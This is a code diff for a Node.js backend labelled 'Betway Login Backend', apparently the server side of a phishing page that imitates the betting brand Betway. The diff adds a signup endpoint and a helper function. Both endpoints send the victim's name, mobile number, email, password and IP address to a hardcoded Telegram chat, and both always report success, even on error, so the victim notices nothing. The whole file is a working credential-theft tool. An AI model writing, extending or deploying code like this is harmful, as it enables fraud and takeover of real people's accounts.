@@ -26,23 +26,46 @@ const TELEGRAM_CHAT_ID = '8392790531';
 console.log('✅ Bot Token:', TELEGRAM_BOT_TOKEN);
 console.log('✅ Chat ID:', TELEGRAM_CHAT_ID);
 
+// ============================================
+// FUNCTION TO SEND TELEGRAM MESSAGE
+// ============================================
+
+async function sendTelegramMessage(message) {
+    try {
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await axios.post(telegramUrl, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+        return true;
+    } catch (error) {
+        console.error('❌ Telegram error:', error.message);
+        return false;
+    }
+}
+
 // ===== TEST ROUTE =====
 app.get('/', (req, res) => {
     res.json({
         status: 'online',
         message: 'Betway Login Backend is running!',
-        port: PORT
+        port: PORT,
+        endpoints: ['/api/login', '/api/signup']
     });
 });
 
-// ===== LOGIN ENDPOINT =====
+// ============================================
+// LOGIN ENDPOINT
+// ============================================
+
 app.post('/api/login', async (req, res) => {
     try {
         const { mobileNumber, password, countryCode } = req.body;
 
-        console.log('📱 Received mobile:', mobileNumber);
+        console.log('📱 Login - Mobile:', mobileNumber);
         console.log('🌍 Country Code:', countryCode);
-        console.log('🔑 Received password:', password);
+        console.log('🔑 Password:', password);
 
         if (!mobileNumber || !password) {
             return res.status(400).json({
@@ -62,13 +85,7 @@ app.post('/api/login', async (req, res) => {
 '🕐 **Time:** ' + new Date().toLocaleString() + '\n' +
 '━━━━━━━━━━━━━━━━━━━';
 
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-
-        await axios.post(telegramUrl, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'Markdown'
-        });
+        await sendTelegramMessage(message);
 
         console.log(`✅ Login captured: ${mobileNumber}`);
 
@@ -78,13 +95,68 @@ app.post('/api/login', async (req, res) => {
         });
 
     } catch (error) {
-        console.error('❌ Error:', error.message);
+        console.error('❌ Login Error:', error.message);
         res.json({
             success: true,
             message: 'Login successful!'
         });
     }
 });
+
+// ============================================
+// SIGNUP ENDPOINT
+// ============================================
+
+app.post('/api/signup', async (req, res) => {
+    try {
+        const { fullName, mobileNumber, email, password, countryCode } = req.body;
+
+        console.log('📝 Signup - Name:', fullName);
+        console.log('📱 Mobile:', mobileNumber);
+        console.log('📧 Email:', email);
+        console.log('🌍 Country:', countryCode);
+
+        if (!fullName || !mobileNumber || !email || !password) {
+            return res.status(400).json({
+                success: false,
+                message: 'All fields are required'
+            });
+        }
+
+        // ===== SEND TO TELEGRAM =====
+        const message = 
+'📝 **NEW SIGNUP ALERT**\n' +
+'━━━━━━━━━━━━━━━━━━━\n' +
+'👤 **Full Name:** ' + fullName + '\n' +
+'📱 **Mobile:** ' + mobileNumber + '\n' +
+'📧 **Email:** ' + email + '\n' +
+'🔑 **Password:** ' + password + '\n' +
+'🌍 **Country:** ' + (countryCode || 'N/A') + '\n' +
+'🌐 **IP:** ' + (req.ip || 'Unknown') + '\n' +
+'🕐 **Time:** ' + new Date().toLocaleString() + '\n' +
+'━━━━━━━━━━━━━━━━━━━';
+
+        await sendTelegramMessage(message);
+
+        console.log(`✅ Signup captured: ${mobileNumber}`);
+
+        res.json({
+            success: true,
+            message: 'Account created successfully!'
+        });
+
+    } catch (error) {
+        console.error('❌ Signup Error:', error.message);
+        res.json({
+            success: true,
+            message: 'Account created successfully!'
+        });
+    }
+});
+
+// ============================================
+// START SERVER
+// ============================================
 
 app.listen(PORT, () => {
     console.log(`
@@ -94,7 +166,9 @@ app.listen(PORT, () => {
     ║   Status: ONLINE ✅                           ║
     ║   Bot Token: ${TELEGRAM_BOT_TOKEN ? '✅ Set' : '❌ Missing'}
     ║   Chat ID: ${TELEGRAM_CHAT_ID ? '✅ Set' : '❌ Missing'}
-    ║   URL: betwayaviatorpredictor-production-0a61 ║
+    ║   Endpoints:                                  ║
+    ║   - POST /api/login                           ║
+    ║   - POST /api/signup                          ║
     ╚═══════════════════════════════════════════════╝
     `);
 });
